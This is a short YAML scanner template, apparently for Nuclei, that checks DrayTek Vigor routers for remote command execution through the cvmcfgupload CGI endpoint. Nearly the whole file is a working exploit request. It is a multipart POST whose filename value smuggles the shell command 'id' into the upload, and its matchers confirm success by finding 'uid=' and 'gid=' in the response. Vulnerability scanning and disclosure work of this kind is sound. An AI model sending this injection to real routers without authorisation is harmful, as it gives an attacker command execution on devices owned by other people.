id: DrayTekVigor-cvmcfgupload-RCE

info:
  name: DrayTekVigor-cvmcfgupload-RCE
  author: iSee857
  severity: high
  description: |
    DrayTekVigor-cvmcfgupload-RCE

http:
  - raw:
      - |
        POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="abc"; filename="t';id;echo '1_"
        Content-Type: text/x-python-script
        
        123
        ------WebKitFormBoundary--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid="
          - "gid="
        condition: and